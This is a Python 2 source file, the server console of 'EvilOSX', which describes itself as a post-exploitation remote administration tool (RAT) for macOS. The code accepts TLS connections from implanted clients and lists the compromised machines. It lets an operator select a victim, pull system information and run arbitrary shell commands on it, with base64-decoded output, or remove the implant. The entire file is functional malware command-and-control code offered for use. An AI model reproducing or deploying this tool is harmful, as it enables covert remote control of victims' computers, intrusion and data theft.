#!/usr/bin/env python
# A pure python, post-exploitation, remote administration tool (RAT) for macOS / OS X.
import socket
import ssl
import thread
import os
import base64

BANNER = '''\
  ______       _  _   ____    _____ __   __
 |  ____|     (_)| | / __ \  / ____|\ \ / /
 | |__ __   __ _ | || |  | || (___   \ V / 
 |  __|\ \ / /| || || |  | | \___ \   > <  
 | |____\ V / | || || |__| | ____) | / . \ 
 |______|\_/  |_||_| \____/ |_____/ /_/ \_\\
 '''

MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

commands = ["help", "status", "clients", "connect", "get_info", "get_computer_name", "get_shell_info", "kill_client"]
status_messages = []

# The ID of the client is it's place in the array
connections = []
current_client_id = None


def print_help():
    print "help            -  Show this help menu."
    print "status          -  Show debug information."
    print "clients         -  Show a list of clients."
    print "connect <ID>    -  Connect to the client."
    print "get_info        -  Show basic information about the client."
    print "kill_client     -  Brutally kill the client (removes the server)."
    print "Any other command will be executed on the connected client."


def print_status():
    for status in status_messages:
        print status


def print_clients():
    if not connections:
        print MESSAGE_ATTENTION + "No available clients."
    else:
        print MESSAGE_INFO + str(len(connections)) + " client(s) available:"

        for client_id in range(len(connections)):
            computer_name = send_command(connections[client_id], "get_computer_name")

            if computer_name:
                print "    {0} = {1}".format(str(client_id), computer_name)


def send_command(connection, message):
    try:
        connection.sendall(message)

        response = connection.recv(4096)
        global current_client_id

        if not response:  # Empty
            current_client_id = None
            connections.remove(connection)

            status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")
            return None
        else:
            return response
    except socket.error:
        current_client_id = None
        connections.remove(connection)

        status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")
        return None


def start_server(port):
    # Start the server
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('', port))
    server_socket.listen(128)  # Maximum connections Mac OSX can handle.

    status_messages.append(MESSAGE_INFO + "Successfully started the server on port {0}.".format(str(port)))
    status_messages.append(MESSAGE_INFO + "Waiting for clients...")

    while True:
        client_connection, client_address = ssl.wrap_socket(server_socket, cert_reqs=ssl.CERT_NONE, server_side=True, keyfile="server.key", certfile="server.crt").accept()

        status_messages.append(MESSAGE_INFO + "New client connected!")
        connections.append(client_connection)


def generate_csr():
    if not os.path.isfile("server.key"):
        # See https://en.wikipedia.org/wiki/Certificate_signing_request#Procedure
        # Basically we're saying "verify that the request is actually from EvilOSX".
        print MESSAGE_INFO + "Generating certificate signing request to encrypt sockets..."

        information = "/C=US/ST=EvilOSX/L=EvilOSX/O=EvilOSX/CN=EvilOSX"
        os.popen("openssl req -newkey rsa:2048 -nodes -x509 -subj {0} -keyout server.key -out server.crt 2>&1".format(information))


if __name__ == '__main__':
    try:
        print BANNER

        server_port = raw_input(MESSAGE_INPUT + "Port to listen on: ")

        generate_csr()
        thread.start_new_thread(start_server, (int(server_port),))

        print MESSAGE_INFO + "Type \"help\" to get a list of available commands."

        while True:
            command = None

            if current_client_id is None:
                command = raw_input("> ")
            else:
                shell_info = str(send_command(connections[current_client_id], "get_shell_info"))

                if shell_info == "None":  # Client no longer connected.
                    command = raw_input("> ")
                else:
                    GREEN = '\033[92m'
                    BLUE = '\033[94m'
                    ENDC = '\033[0m'

                    username = shell_info.split("\n")[0]
                    hostname = shell_info.split("\n")[1]
                    path = shell_info.split("\n")[2]

                    command = raw_input((GREEN + "{0}@{1}" + ENDC + ":" + BLUE + "{2}" + ENDC + "$ ").format(username, hostname, path))

            if command.split(" ")[0] in commands:
                if command == "help":
                    print_help()
                elif command == "status":
                    print_status()
                elif command == "clients":
                    print_clients()
                elif command.startswith("connect"):
                    try:
                        specified_id = int(command.split(" ")[1])
                        computer_name = send_command(connections[specified_id], "get_computer_name")

                        print MESSAGE_INFO + "Connected to \"{0}\", ready to send commands.".format(computer_name)

                        current_client_id = specified_id
                    except (IndexError, ValueError) as ex:
                        print MESSAGE_ATTENTION + "Invalid client ID (see \"clients\")."
                else:
                    # Commands that require an active connection
                    if current_client_id is None:
                        print MESSAGE_ATTENTION + "Not connected to a client (see \"connect\")."
                    else:
                        if command == "get_info":
                            print MESSAGE_INFO + "Getting system information..."
                            print send_command(connections[current_client_id], "get_info")
                        elif command == "kill_client":
                            print MESSAGE_INFO + "Removing server..."
                            response = send_command(connections[current_client_id], "kill_client")

                            print MESSAGE_INFO + "Got message from client: " + response
                            connections.remove(connections[current_client_id])
                            current_client_id = None
                            status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")

                            print MESSAGE_INFO + "Done."

            else:
                # Regular shell command
                if current_client_id is None:
                    print MESSAGE_ATTENTION + "Not connected to a client (see \"connect\")."
                else:
                    response = base64.b64decode(send_command(connections[current_client_id], command))

                    if command.startswith("cd"):
                        pass
                    elif response == "EMPTY":
                        print MESSAGE_ATTENTION + "No command output."
                    else:
                        print response
    except ValueError:
        print "[I] Invalid port."
    except KeyboardInterrupt:
        print ""

